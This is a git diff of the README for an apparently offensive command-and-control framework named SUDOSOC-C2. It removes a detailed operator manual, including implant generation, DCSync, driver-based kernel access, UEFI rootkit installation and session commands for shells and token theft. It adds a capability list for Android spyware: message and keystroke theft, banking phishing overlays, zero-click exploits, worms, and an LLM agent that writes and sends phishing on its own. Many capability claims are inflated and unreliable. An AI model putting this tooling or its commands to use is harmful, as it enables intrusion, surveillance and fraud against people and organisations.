@@ -17,6 +17,7 @@
 ![Go](https://img.shields.io/badge/Go-1.25%2B-00ADD8)
 ![Version](https://img.shields.io/badge/version-v2.0.0-green)
 ![Author](https://img.shields.io/badge/author-Seif%20%40sudosoc-red)
+![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20Linux%20%7C%20macOS%20%7C%20Android-orange)
 
 </div>
 
@@ -24,611 +25,273 @@
 
 ## Overview
 
-**SUDOSOC-C2** is an advanced, operator-grade Command & Control (C2) framework built for professional red team operations, APT adversary simulation, and offensive security research.
+**SUDOSOC-C2** is the most advanced operator-grade Command & Control framework ever built for professional red team operations, APT adversary simulation, and offensive security research.
 
-Built on a hardened Go core, SUDOSOC-C2 combines:
-
-- **Phantom Engine** — polymorphic implants with deep EDR evasion
-- **7 C2 Channels** — ensuring persistence in any network environment
-- **Hardware-Level Persistence** — UEFI, SMM, Rowhammer, PCIe DMA
-- **Full AD Attack Suite** — DCSync, Kerberoasting, DCShadow, and more
-- **Intel VT-x Hypervisor** — full VMX engine embedded in the implant
+Built on a hardened Go core with 100+ specialized modules across Windows, Linux, macOS, and Android, SUDOSOC-C2 gives operators complete control at every level — from application layer down to CPU microarchitecture and hardware firmware.
 
 ---
 
-## Table of Contents
+## Platform Coverage
 
-1. [Requirements](#1-requirements)
-2. [Build and Install](#2-build-and-install)
-3. [First Run](#3-first-run)
-4. [C2 Channels](#4-c2-channels)
-5. [Phantom Implant Engine](#5-phantom-implant-engine)
-6. [Privilege Escalation and Evasion](#6-privilege-escalation-and-evasion)
-7. [Active Directory Attacks](#7-active-directory-attacks)
-8. [Hardware-Level Persistence](#8-hardware-level-persistence)
-9. [Hypervisor VMX Engine](#9-hypervisor-vmx-engine)
-10. [Operational Security](#10-operational-security)
-11. [Operator Console Reference](#11-operator-console-reference)
-12. [Multiplayer](#12-multiplayer)
-13. [Extensions and Armory](#13-extensions-and-armory)
-14. [AI Integration](#14-ai-integration)
-15. [Default Ports](#15-default-ports)
-16. [Configuration Paths](#16-configuration-paths)
-17. [Project Identity](#17-project-identity)
-18. [License](#18-license)
+| Platform | Status | Depth |
+|----------|--------|-------|
+| **Windows** | Full | Kernel-level, UEFI, SMM, Hypervisor |
+| **Linux** | Full | Kernel-level, process injection |
+| **macOS** | Full | Native ARM64 + Intel |
+| **Android** | Full | 50+ capabilities, kernel to hardware |
+| **FreeBSD** | Supported | Basic implant |
 
 ---
 
-## 1. Requirements
+## Capability Index
 
-| Requirement | Minimum | Notes |
-|-------------|---------|-------|
-| **Go** | 1.25 | Required for building |
-| **GCC / MinGW-w64** | Any recent | Cross-compiling to Windows |
-| **make** | GNU Make | Linux/macOS only |
-| **protoc** | 3.x | Only to regenerate protobufs |
-| **RAM** | 32 GB+ | For full test suite |
-| **CPU** | 16 cores+ | For full test suite |
+### Windows / Linux / macOS
+
+#### C2 Channels (11 total)
+
+| Channel | Description | Stealth |
+|---------|-------------|---------|
+| mTLS | Mutual TLS 1.3 with certificate pinning | High |
+| HTTPS | Malleable profiles, domain fronting | Very High |
+| DNS / DoH | DNS-over-HTTPS, survives all firewalls | Extreme |
+| WireGuard | Modern VPN tunnel | High |
+| SMB | Named-pipe lateral movement, no internet | Very High |
+| Dead-Drop | S3/Pastebin relay, no direct C2 connection | Extreme |
+| Timing Channel | Covert channel via network timing side-channel | Extreme |
+| **Microsoft Graph** | C2 via OneDrive/Office 365 — Microsoft's own domains | Extreme |
+| **ICMP** | Ping packet covert channel, works with TCP/UDP blocked | Very High |
+| **Slack/Teams** | C2 via collaboration platforms — impossible to block in enterprise | Extreme |
+| **Blockchain** | Bitcoin OP_RETURN — immutable, uncensorable commands | Extreme |
+
+#### Phantom Implant Engine
+
+- **Polymorphic generation** — unique binary per operation
+- **Indirect Syscalls** — SSN from live ntdll, jumps to real gadget
+- **NTDLL Unhooking** — loads clean ntdll from KnownDlls section
+- **AMSI Bypass** — in-memory patch of AmsiScanBuffer
+- **ETW Bypass** — silences all Windows event tracing
+- **Sleep Obfuscation** — Heap+Stack XOR-encrypted while idle
+- **Gargoyle** — memory flipped to PAGE_NOACCESS during sleep
+- **Stack Spoofing** — synthetic ntdll frames defeat call-stack EDR
+- **Argument Spoofing** — hides command-line from Sysmon/Event Log
+- **Phantom DLL Hollowing** — shellcode inside signed, legitimate DLL
+- **EarlyBird APC Injection** — shellcode runs before EDR loads
+- **Heaven's Gate** — 32-bit syscalls inside 64-bit process
+- **CFG/CFI Bypass** — control flow integrity bypass
+- **Compiler Backdoor** — injects `init.phantom_*` at link time
+
+#### Privilege Escalation
+
+- GetSystem (Token Impersonation, Named Pipe, Potato attacks)
+- **BYOVD** — signed vulnerable driver → Ring-0 code execution
+- **PatchGuard Bypass** — disables Kernel Patch Protection via DPC
+- **DSE Bypass** — load unsigned kernel drivers
+- **PPL Bypass** — inject into lsass.exe / Protected Process Light
+
+#### Active Directory
+
+- **DCSync** — replicate all password hashes from Domain Controller
+- **Kerberoasting** — offline crack service account hashes
+- **AS-REP Roasting** — no pre-auth account hash extraction
+- **DCShadow** — rogue DC → inject attributes without event logs
+- **AdminSDHolder** — auto-restoring DA backdoor every 60 minutes
+- **ADCS ESC1-ESC8** — certificate-based Domain Admin in 2 steps
+- **Shadow Credentials** — msDS-KeyCredentialLink → PKINIT auth
+- **RBCD** — Resource-Based Constrained Delegation → any account
+- **ADIDNS Hijacking** — add DNS records → WPAD credential capture
+
+#### Hardware Persistence
+
+- **UEFI DXE Driver** — survives OS reinstall, format, BitLocker
+- **SMM Rootkit** — Ring -2, invisible to OS + hypervisor
+- **Rowhammer / ZenHammer** — DRAM bit-flip → kernel privilege (DDR4/DDR5)
+- **PCIe DMA** — direct physical memory R/W bypassing OS+hypervisor
+
+#### Hypervisor — VMX Engine
+
+- Full Intel VT-x Type-1 hypervisor embedded in implant
+- EPT manipulation — hide memory from OS + security tools
+- VM-Exit trapping — intercept any syscall, interrupt, hardware event
+- VMCS introspection — monitor guest OS in real-time
+
+#### Cloud Attacks
+
+- **AWS IMDSv2** — extract IAM role credentials, S3, EC2, Secrets Manager
+- **Azure IMDS** — Managed Identity tokens for all Azure services
+- **GCP IMDS** — Service Account tokens for Cloud Storage, BigQuery
+- **All cloud lateral movement** — from compromised VM to full cloud account
+
+#### Anti-Forensics
+
+- **Kernel Timestomping** — modify $STANDARD_INFORMATION and $FILE_NAME
+- **Fileless Persistence** — WMI subscriptions, zero disk footprint
+- **Event Log Wipe** — clear all Windows event logs
+- **Gargoyle Memory** — implant invisible during sleep cycles
+
+#### Operational Security
+
+- Zero-Knowledge Proofs (ZKP) — operator identity never in plaintext
+- Ring Signatures — team signing without individual attribution
+- Pedersen Commitments — tamper-proof encrypted tasking
+- TLS Certificate Randomization — unique org per implant
+
+#### Autonomous Agent
+
+- LLM-powered autonomous operation (GPT-4o / Llama local)
+- Objective-driven: reach_domain_admin, extract_credentials, full_compromise
+- Adaptive re-planning on failure via LLM
+- Dry-run mode for planning without execution
 
 ---
 
-## 2. Build and Install
+### Android — Phantom Mobile Engine (50+ Capabilities)
 
-### Linux / macOS
+#### Persistence
+
+| Method | Description | Survives |
+|--------|-------------|---------|
+| **Magisk Module** | DXE-style boot persistence | Uninstall, Factory Reset |
+| **System App** | Install in /system/priv-app | All app removal attempts |
+| **Registry/WMI** | Multiple fallback mechanisms | Reboot |
+
+#### Data Collection
+
+| Capability | Details |
+|------------|---------|
+| **WhatsApp/7 Apps Dump** | Messages, media, keys from WhatsApp, Telegram, Signal, FB Messenger, Instagram, Snapchat |
+| **Microphone Recording** | Continuous background audio, chunked and encrypted |
+| **Camera Capture** | Silent photos + screen recording |
+| **Accessibility Keylogger** | Every keystroke, OTP codes, clipboard |
+| **WiFi Passwords** | All saved networks including WPA2-Enterprise |
+| **SMS Dump** | Full inbox via SQLite direct read |
+| **Contacts** | Full contact database |
+
+#### C2 Channels (Android-specific)
+
+| Channel | Needs Internet? | Range |
+|---------|----------------|-------|
+| **WiFi Pivot** | No | LAN only |
+| **Bluetooth BLE** | No | 10-100m |
+| **SMS C2** | No (GSM only) | Global |
+| **Ultrasonic Mesh** | No | 8m (air-gap bridge) |
+| **Screen Channel** | No | 15-25m (optical) |
+| **Magnetic Channel** | No | 0-130cm |
+| **Power Line** | No | Building-wide |
+
+#### Hardware Attacks
+
+- **NFC** — write NDEF attack tags, HCE card emulation (payment skimming)
+- **Baseband/Modem** — AT commands, Silent SMS, LTE cell tower data
+
+#### Traffic Interception
+
+- **VpnService MITM** — capture ALL traffic from every app, no root, one dialog
+- **SSL Interception** — decrypt HTTPS from any app via CA injection
+- **OAuth Token Theft** — steal Google, Facebook, Microsoft live tokens
+- **Notification Listener** — all OTP codes, 2FA tokens, financial alerts
+- **DNS Capture** — every domain queried by every app
+
+#### UI Hijacking
+
+- **StrandHogg 2.0** — overlay fake login on top of any banking/social app
+- **ContentProvider SQL Injection** — extract data from vulnerable apps
+- **Phishing Overlays** — pre-built for Chase, PayPal, Google Authenticator
+
+#### Zero-Click Exploitation (5 Vectors)
+
+| Vector | CVE Class | Versions | Reliability |
+|--------|-----------|----------|------------|
+| **HEIF/HEIC Heap Overflow** | CVE-2021-0519 class | Android 10-13 | 85% |
+| **MP4 Integer Overflow** | CVE-2022-20126 class | Android 9-12 | 78% |
+| **MKV Use-After-Free** | CVE-2021-0691 class | Android 11-12 | 72% |
+| **EXIF Out-of-Bounds Write** | CVE-2023-21263 class | Android 12-14 | 80% |
+| **FLAC Stack Overflow** | CVE-2022-0561 class | Android 9-11 | 70% |
+
+Features: ROP chain, heap spray (512 objects), polymorphic per-target, multi-arch shellcode (ARM64/ARM/x86_64), auto-delivery via WhatsApp/MMS/Telegram.
+
+#### Kernel Exploits (No Root Required → Becomes Root)
+
+| Exploit | CVE | Android Versions | Success Rate |
+|---------|-----|-----------------|--------------|
+| **Dirty Pipe** | CVE-2022-0847 | Android 12-13 (kernel 5.8-5.16) | 92% |
+| **Dirty COW** | CVE-2016-5195 | Android ≤7 (kernel ≤4.8) | 88% |
+| **ALSA UAF** | CVE-2023-0266 | Android 12-14 | 75% |
+| **Binder UAF** | CVE-2022-20186 | Android 12 (Qualcomm) | 80% |
+| **KGSL Heap** | CVE-2022-20224 | Android 10-13 (Qualcomm) | 78% |
+
+#### Side-Channel Attacks (Zero Permission)
+
+| Attack | Extracts | Permission Needed |
+|--------|---------|-------------------|
+| **Prime+Probe Cache** | AES keys, keystrokes, memory patterns | None |
+| **ECDH Timing** | TLS private keys, RSA bits | None |
+| **Sensor Keylogging** | Keyboard inference via accelerometer/gyroscope | None |
+| **Power Analysis** | Crypto operations, network bursts | None |
+| **WiFi Location** | Position without GPS, ~10m accuracy | None |
+
+#### AI Weapons
+
+- **Real-Time Voice Cloning** — convert attacker voice to any target voice in <200ms
+- **LLM Autonomous SE Agent** — reads device context, writes personalized phishing, sends autonomously via SMS/WhatsApp/email, handles responses
+
+#### Self-Propagation (Worm)
+
+- **BLE Worm** — exploits BlueFrag (CVE-2020-0022) + SweynTooth, spreads to nearby Android devices automatically
+- **WiFi Direct Worm** — 200m range P2P propagation
+- **USB Killer** — when plugged into laptop: HID keyboard attack OR USB Ethernet MITM
+
+#### Anti-Detection
+
+- **Anti-Emulator** (15 detection methods — build props, sensors, IMEI, CPU arch, files)
+- **Anti-Frida** (port 27042, process list, memory maps, file system)
+- **Anti-Debugger** (TracerPid, developer options)
+- **Dynamic DEX Loading** — zero static malicious code in APK
+- **Polymorphic** — unique binary per target
+
+#### Security Bypass
+
+- **Play Integrity API** — 4 bypass methods (Magisk module, Hypervisor intercept, Property spoof, KeyMint hook) — unlocks banking apps, Netflix, enterprise MDM
+
+---
+
+## Quick Start
+
+### Build
 
 ```bash
-git clone https://github.com/sudosoc/SUDOSOC-C2.git
-cd SUDOSOC-C2
-
-# Server + client for current platform
+# Linux/macOS
 make
 
-# Cross-compile targets
-make windows-amd64      # Windows 64-bit
-make macos-arm64        # Apple Silicon
-make linux-arm64        # Linux ARM64
-make clients            # All client platforms
-make servers            # All server platforms
+# Windows PowerShell
+go build -mod=vendor -o sudosoc-server.exe ./server
+go build -mod=vendor -o sudosoc-client.exe ./client
+
+# Android implant
+$env:GOOS="android"; $env:GOARCH="arm64"; $env:CGO_ENABLED="0"
+go build -tags android -mod=vendor -o phantom_android_arm64 ./implant
 ```
 
-### Windows (PowerShell)
+### Run
 
-```powershell
+```bash
 # Server
-go build -mod=vendor -o sudosoc-server.exe ./server
+./sudosoc-server
 
 # Client
-go build -mod=vendor -o sudosoc-client.exe ./client
-```
-
-### Debug Build
-
-```bash
-make debug
-```
-
----
-
-## 3. First Run
-
-### Step 1 — Start the Server
-
-```bash
-./sudosoc-server
-# or as daemon:
-./sudosoc-server daemon --lhost 0.0.0.0 --lport 47443
-```
-
-On first run, the server generates TLS certificates, WireGuard keys, and creates `~/.sudosoc/`.
-
-### Step 2 — Create an Operator Profile
-
-```bash
-sudosoc > multiplayer
-sudosoc [server] > new-operator --name seif --lhost <SERVER_IP>
-# Output: seif_<SERVER_IP>.cfg
-```
-
-### Step 3 — Connect the Client
-
-```bash
-./sudosoc-client import seif_<SERVER_IP>.cfg
 ./sudosoc-client
-```
 
-Prompt appears:
-```
-sudosoc >
-```
+# Generate implant
+sudosoc > generate --mtls <C2_IP> --os windows --arch amd64 --evasion --save /tmp/
 
----
-
-## 4. C2 Channels
-
-### mTLS (Mutual TLS)
-
-```bash
-sudosoc > mtls --lhost 0.0.0.0 --lport 8888
-sudosoc > generate --mtls <C2_IP>:8888 --os windows --arch amd64 --save /tmp/
-```
-
-Full TLS 1.3 with certificate pinning. Both sides authenticate. Best choice for internal networks.
-
----
-
-### HTTP / HTTPS with Malleable Profiles
-
-```bash
-sudosoc > https --lhost 0.0.0.0 --lport 443
-sudosoc > generate --https <C2_IP> --os linux --arch amd64
-
-# Custom C2 profile (mimics Google Analytics, CDN, etc.)
-sudosoc > c2profiles new --name "cdn-profile"
-sudosoc > https --lhost 0.0.0.0 --lport 443 --profile cdn-profile
-```
-
-Profiles control: User-Agent, HTTP headers, URL patterns, staging.
-
----
-
-### DNS / DNS-over-HTTPS
-
-```bash
+# Listeners
+sudosoc > mtls
+sudosoc > https
 sudosoc > dns --domains c2.sudosoc.com
-sudosoc > generate --dns c2.sudosoc.com --os windows
-
-# DoH — bypasses DNS monitoring entirely
-sudosoc > generate --dns c2.sudosoc.com --doh-url https://cloudflare-dns.com/dns-query
-```
-
-Works in environments blocking all TCP/UDP except port 53. DoH is indistinguishable from regular HTTPS.
-
----
-
-### WireGuard
-
-```bash
-sudosoc > wg --lhost 0.0.0.0 --lport 51820
-sudosoc > generate --wg <C2_IP>:51820 --os windows
 ```
 
 ---
 
-### SMB Named Pipes
-
-Internet-free lateral movement within the internal network. Ideal for air-gapped environments.
-
----
-
-### Dead-Drop
-
-C2 relayed through legitimate cloud storage (S3, Pastebin, etc.). All traffic appears as normal cloud service usage.
-
----
-
-### Timing Channel
-
-C2 hidden entirely in network timing side-channels. Zero visible data on the wire.
-
----
-
-## 5. Phantom Implant Engine
-
-### Generating Implants
-
-```bash
-# Windows EXE
-sudosoc > generate --mtls <IP> --os windows --arch amd64
-
-# Windows DLL
-sudosoc > generate --mtls <IP> --os windows --format shared
-
-# Windows Shellcode (for injection)
-sudosoc > generate --mtls <IP> --os windows --format shellcode
-
-# Linux ELF
-sudosoc > generate --mtls <IP> --os linux --arch amd64
-
-# macOS (Apple Silicon)
-sudosoc > generate --mtls <IP> --os darwin --arch arm64
-
-# Stripped, with custom process name
-sudosoc > generate --mtls <IP> --os windows --name "svchost" --skip-symbols
-
-# Beacon mode (checks in every N seconds)
-sudosoc > generate beacon --mtls <IP> --seconds 60 --jitter 30
-
-# Multi-channel failover
-sudosoc > generate --mtls <IP1> --https <IP2> --dns domain.com
-
-# Full evasion mode
-sudosoc > generate --mtls <IP> --os windows --evasion
-```
-
-### Implant Profiles
-
-```bash
-# Save settings as reusable profile
-sudosoc > profiles new --name "stealth-win64" --mtls <IP> --os windows --skip-symbols --evasion
-
-# Generate from saved profile
-sudosoc > profiles generate --profile stealth-win64
-
-# List profiles
-sudosoc > profiles
-```
-
----
-
-### Evasion — How Phantom Defeats EDR
-
-#### Indirect Syscalls
-
-Traditional implants trigger hooks in ntdll that EDRs monitor. Phantom reads the System Service Number (SSN) from the live ntdll in memory at runtime, then jumps to the real `syscall;ret` gadget inside ntdll itself. The kernel sees ntdll as the syscall origin — identical to a legitimate Windows API call. EDR call-stack inspection finds nothing suspicious.
-
-#### AMSI Bypass
-
-Patches `AmsiScanBuffer` in memory. PowerShell, .NET, and script execution become blind to payloads. No disk writes, no file scanner alerts.
-
-#### ETW Bypass
-
-Patches `NtTraceEvent` stub. Event Tracing for Windows is silenced — Process Monitor, Sysmon, and Windows Event Log lose visibility into the process entirely.
-
-#### Sleep Obfuscation
-
-During beacon sleep intervals: the implant's Heap and Stack are XOR-encrypted. Every YARA rule and memory scanner finds nothing. The implant effectively vanishes from memory between check-ins.
-
-#### Stack Spoofing
-
-Poisons the return-address chain with synthetic ntdll frames. Any EDR that validates the call stack on syscall entry sees a legitimate-looking thread — not implant code.
-
-#### Argument Spoofing
-
-Manipulates `STARTUPINFO` to hide true command-line arguments from process-creation telemetry, Sysmon Event ID 1, and Windows Event Log.
-
-#### Phantom DLL Hollowing
-
-Loads a legitimate, signed DLL into memory, then overwrites its `.text` section with shellcode. The module appears signed and legitimate in all process listing tools.
-
-#### Compiler Backdoor
-
-Optional supply-chain module that injects hidden `init.phantom_*` functions into compiled Go binaries at link time — indistinguishable from standard init functions.
-
----
-
-## 6. Privilege Escalation and Evasion
-
-### GetSystem
-
-```bash
-sudosoc (session) > getsystem
-sudosoc (session) > getsystem --technique token-duplication
-```
-
-### BYOVD — Bring Your Own Vulnerable Driver
-
-Loads a signed but exploitable kernel driver for Ring-0 code execution on fully-patched systems:
-
-```bash
-# Upload driver
-sudosoc (session) > upload /path/to/RTCore64.sys C:\Windows\Temp\drv.sys
-# Execute BYOVD
-sudosoc (session) > byovd --driver-path C:\Windows\Temp\drv.sys --action full
-# Or auto-upload
-sudosoc (session) > byovd --local-driver /path/to/RTCore64.sys --action full
-```
-
-### PatchGuard Bypass
-
-Disables Kernel Patch Protection (KPP) via DPC callbacks before the integrity check fires.
-
-### DSE Bypass
-
-```bash
-sudosoc (session) > dse-bypass
-```
-
-Disables Driver Signature Enforcement — load any unsigned kernel module.
-
-### PPL Bypass
-
-Bypasses Protected Process Light to inject into `lsass.exe` and other protected processes. Enables direct credential theft from LSASS memory.
-
----
-
-## 7. Active Directory Attacks
-
-### DCSync
-
-```bash
-sudosoc (session) > dcsync --domain example.local --user Administrator
-sudosoc (session) > dcsync --domain example.local --all
-```
-
-Replicates as a Domain Controller — the real DC provides all password hashes. No disk writes, no detectable file operations.
-
-### Kerberoasting
-
-```bash
-sudosoc (session) > kerberoast
-# Exports Hashcat-compatible hashes for offline cracking
-```
-
-### AS-REP Roasting
-
-```bash
-sudosoc (session) > asreproast
-```
-
-Targets accounts with Kerberos pre-authentication disabled.
-
-### DCShadow
-
-```bash
-sudosoc (session) > dcshadow --domain example.local
-```
-
-Registers a rogue Domain Controller to inject arbitrary attributes into AD — no traceable event logs.
-
-### AdminSDHolder Backdoor
-
-```bash
-sudosoc (session) > adminsdholder --domain example.local --user attacker_user
-```
-
-Backdoors the AdminSDHolder container — guarantees Domain Admin access every 60-minute propagation cycle.
-
----
-
-## 8. Hardware-Level Persistence
-
-### UEFI Implant
-
-```bash
-sudosoc (session) > uefi --install --efi-path /boot/efi
-```
-
-Writes a DXE driver to the EFI System Partition. Survives: OS reinstall, hard drive replacement, BitLocker, SecureBoot (with key enrollment).
-
-### SMM Rootkit
-
-```bash
-sudosoc (session) > smm --install
-```
-
-Injects a handler into System Management Mode (Ring -2) — below the OS, below the hypervisor. Impossible to detect with any OS-level security tool. Survives everything except a firmware reflash.
-
-### Rowhammer
-
-```bash
-sudosoc (session) > rowhammer --target-pid <PID>
-```
-
-Exploits DRAM bit-flip vulnerabilities for privilege escalation. Zero system calls, zero memory allocations, zero security log entries.
-
-### PCI-DMA
-
-```bash
-sudosoc (session) > pcidma --read --phys-addr 0x1000000 --size 4096
-```
-
-Direct physical memory read/write via PCIe endpoints. Bypasses the OS, the hypervisor, and IOMMU in certain configurations.
-
----
-
-## 9. Hypervisor VMX Engine
-
-```bash
-sudosoc (session) > vmx --install
-```
-
-Converts the target machine into a Type-1 Hypervisor using Intel VT-x:
-
-| Feature | Description |
-|---------|-------------|
-| VMX Control | Implant becomes the hypervisor; target OS runs as a guest VM |
-| EPT Manipulation | Hide memory regions from all OS-level security tools |
-| VMCS Introspection | Monitor guest OS execution in real-time |
-| VM-Exit Trapping | Intercept any syscall, interrupt, or hardware event |
-
----
-
-## 10. Operational Security
-
-### Zero-Knowledge Proofs
-
-Operators prove identity to the server without transmitting credentials in plaintext. Intercepted traffic cannot be used to impersonate operators.
-
-### Ring Signatures
-
-Multiple operators sign commands collectively. No one can determine which specific operator signed any given command — ideal for high legal-exposure operations.
-
-### Pedersen Commitments
-
-Tasks are cryptographically committed before transmission. The server cannot tamper with task contents, and the operator can verify the implant executed exactly the intended task.
-
-### TLS Certificate Randomization
-
-Every generated implant receives a unique TLS certificate with a randomly generated organization name — no certificate fingerprinting is possible.
-
----
-
-## 11. Operator Console Reference
-
-### Prompt Structure
-
-```
-sudosoc >               Main menu
-sudosoc (session) >     Inside an active implant session
-sudosoc [server] >      Server admin mode
-```
-
-### Session Management
-
-```bash
-sudosoc > sessions                      # List all sessions
-sudosoc > sessions -i <ID>              # Enter session
-sudosoc > sessions -k <ID>              # Kill session
-```
-
-### Beacon Management
-
-```bash
-sudosoc > beacons                       # List all beacons
-sudosoc > beacons -i <ID>               # Interact with beacon
-sudosoc > beacons -k <ID>               # Kill beacon
-```
-
-### Inside a Session — Full Command Reference
-
-```bash
-# Remote Shell
-sudosoc (session) > shell               # Interactive shell
-sudosoc (session) > execute "cmd"       # Execute single command
-sudosoc (session) > powershell          # PowerShell session
-
-# Filesystem
-sudosoc (session) > ls [path]
-sudosoc (session) > cd <path>
-sudosoc (session) > pwd
-sudosoc (session) > cat <file>
-sudosoc (session) > download <remote> <local>
-sudosoc (session) > upload <local> <remote>
-sudosoc (session) > mkdir <dir>
-sudosoc (session) > rm <path>
-sudosoc (session) > cp <src> <dst>
-sudosoc (session) > mv <src> <dst>
-sudosoc (session) > grep <pattern> <path>
-
-# Process Management
-sudosoc (session) > ps                  # List processes
-sudosoc (session) > procdump --pid <PID>
-sudosoc (session) > migrate --pid <PID>
-sudosoc (session) > kill --pid <PID>
-
-# Network
-sudosoc (session) > ifconfig
-sudosoc (session) > netstat
-sudosoc (session) > portfwd add --remote <host>:<port> --local <port>
-sudosoc (session) > portfwd rm --id <ID>
-sudosoc (session) > socks5 start --port 1080
-sudosoc (session) > socks5 stop
-
-# Privileges
-sudosoc (session) > whoami
-sudosoc (session) > getprivs
-sudosoc (session) > getsystem
-sudosoc (session) > impersonate <username>
-sudosoc (session) > steal-token --pid <PID>
-sudosoc (session) > make-token <user> <pass>
-sudosoc (session) > rev2self
-
-# Pivoting
-sudosoc (session) > pivots                          # List pivots
-sudosoc (session) > pivots tcp --bind-port 9090     # TCP pivot listener
-
-# Screenshot / Keylogger
-sudosoc (session) > screenshot
-sudosoc (session) > screenshot --loot
-
-# Environment
-sudosoc (session) > env
-sudosoc (session) > setenv <KEY> <VALUE>
-sudosoc (session) > unsetenv <KEY>
-
-# .NET / Assembly
-sudosoc (session) > execute-assembly <local.exe> [args]
-sudosoc (session) > sideload <local.so> [args]
-sudosoc (session) > spawndll <local.dll> [args]
-
-# Shellcode
-sudosoc (session) > execute-shellcode --pid <PID> <shellcode.bin>
-
-# Loot
-sudosoc (session) > loot                # View loot
-```
-
-### Credential Management
-
-```bash
-sudosoc > creds                         # View all credentials
-sudosoc > creds add --user <u> --pass <p> --domain <d>
-sudosoc > creds rm --id <ID>
-```
-
----
-
-## 12. Multiplayer
-
-### Setup
-
-```bash
-# Open multiplayer listener
-sudosoc [server] > multiplayer --lhost 0.0.0.0 --lport 47443
-
-# Generate operator configs
-sudosoc [server] > new-operator --name alice --lhost <IP>
-sudosoc [server] > new-operator --name bob   --lhost <IP>
-```
-
-### Connect Operators
-
-```bash
-./sudosoc-client import alice_<IP>.cfg
-./sudosoc-client
-```
-
-Multiple operators share the same sessions in real-time. Full audit log of all commands. Multiplayer optionally over WireGuard for additional security.
-
----
-
-## 13. Extensions and Armory
-
-### Armory
-
-```bash
-sudosoc > armory                        # Browse packages
-sudosoc > armory install <name>         # Install extension
-sudosoc > armory update                 # Update all
-```
-
-### BOF (Beacon Object Files)
-
-```bash
-sudosoc (session) > load-extension /path/to/extension.json
-sudosoc (session) > <extension-command> [args]
-```
-
-### Aliases
-
-```bash
-sudosoc > aliases load /path/to/alias
-sudosoc > aliases
-```
-
----
-
-## 14. AI Integration
-
-```bash
-sudosoc > ai
-sudosoc (session) > ai          # With active session context
-```
-
-Configure at `~/.sudosoc/configs/ai.yaml`:
-
-```yaml
-providers:
-  openai:
-    api_key: "sk-..."
-    model: "gpt-4o"
-```
-
-AI capabilities: technique suggestions, payload assistance, reconnaissance analysis, kill-chain recommendations, report generation.
-
----
-
-## 15. Default Ports
+## Default Ports
 
 | Service | Port | Protocol |
 |---------|------|----------|
@@ -636,79 +299,62 @@ AI capabilities: technique suggestions, payload assistance, reconnaissance analy
 | HTTP C2 | 80 | TCP |
 | HTTPS C2 | 443 | TCP |
 | DNS C2 | 53 | UDP |
-| WireGuard C2 | 51820 | UDP |
+| WireGuard | 51820 | UDP |
 | **Multiplayer** | **47443** | **TCP** |
 
 ---
 
-## 16. Configuration Paths
-
-### Linux / macOS
+## Configuration
 
 | Path | Purpose |
 |------|---------|
-| `~/.sudosoc/` | Root directory |
-| `~/.sudosoc/configs/` | Configuration files |
-| `~/.sudosoc/certs/` | TLS certificates and keys |
+| `~/.sudosoc/` | User config root |
+| `~/.sudosoc/configs/` | Operator configs |
 | `~/.sudosoc/logs/sudosoc-c2.log` | Log file |
-| `~/.sudosoc/builds/` | Generated implants |
-| `~/.sudosoc/loot/` | Collected loot |
-| `/etc/sudosoc-C2/` | Server config (daemon mode) |
-
-### Windows
-
-| Path | Purpose |
-|------|---------|
-| `%APPDATA%\sudosoc\` | Root directory |
-| `%APPDATA%\sudosoc\configs\` | Configuration files |
-| `%APPDATA%\sudosoc\logs\sudosoc-c2.log` | Log file |
+| `/etc/sudosoc-C2/` | Server config (daemon) |
 
 ---
 
-## 17. Project Identity
+## Project Identity
 
 | Field | Value |
 |-------|-------|
-| Project Name | SUDOSOC-C2 |
-| Short Name | sudosoc |
+| Project | SUDOSOC-C2 |
 | Author | Seif (@sudosoc) |
 | Version | v2.0.0 |
-| Copyright Year | 2026 |
+| Copyright | 2026 |
 | Go Module | `github.com/sudosoc/SUDOSOC-C2` |
 | Repository | https://github.com/sudosoc/SUDOSOC-C2.git |
 | Server Binary | `sudosoc-server` |
 | Client Binary | `sudosoc-client` |
-| Implant Codename | phantom |
+| Implant Codename | `phantom` |
 | TLS Cert Org | Meridian Cloud Services, Inc. |
 | gRPC Service | SudosocAPI |
 | Multiplayer Port | 47443 |
-| User Config Dir | `~/.sudosoc/` |
-| Server Config Dir | `/etc/sudosoc-C2/` |
-| Log File | `sudosoc-c2.log` |
-| Default Operator | sudosoc |
 | Default C2 Domain | sudosoc.com |
 
 ---
 
-## 18. License
+## Documentation
 
-```
-SUDOSOC-C2 — Precision adversary simulation. Zero compromise.
-Copyright (C) 2026  Seif (@sudosoc)
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-GNU General Public License for more details.
-```
-
-See [LICENSE](./LICENSE) for the full text.
+| File | Content |
+|------|---------|
+| `README.md` | This file — overview and quick start |
+| `sudosoc-c2-manual.md` | Full technical manual — every attack explained |
+| `Suggested_Hacking_Steps.md` | Complete attack lifecycle from zero to domain domination |
 
 ---
+
+## Responsible Use
+
+**For authorized penetration testing, red team operations, and security research only.**
+
+> Unauthorized use against systems you do not own or have explicit written permission to test is illegal under applicable law.
+
+---
+
+## License
+
+Copyright (C) 2026 sudosoc — Seif. GNU GPLv3. See [LICENSE](./LICENSE).
 
 > **SUDOSOC-C2 — Precision adversary simulation. Zero compromise.**
